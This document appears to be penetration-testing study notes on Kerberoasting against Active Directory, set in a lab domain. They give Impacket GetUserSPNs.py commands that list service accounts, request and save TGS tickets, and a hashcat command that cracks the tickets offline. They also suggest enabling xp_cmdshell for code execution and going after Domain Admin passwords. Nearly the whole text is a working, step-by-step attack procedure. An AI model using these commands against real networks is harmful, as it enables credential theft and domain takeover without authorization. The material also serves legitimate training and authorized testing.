All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.
#### Listing SPN Accounts with GetUserSPNs.py
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
**!!** If a user is part of Domain Admins group (We can see this in the output int the MemberOf column), we should look to crack their password for an easy win.
#### Requesting all TGS Tickets
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```
#### Requesting a Single TGS ticket
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
#### Saving the TGS Ticket to an Output File
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
**Crack** Now we can attempt to crack the ticket offline using Hashcat hash modeÂ `13100`.
```shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

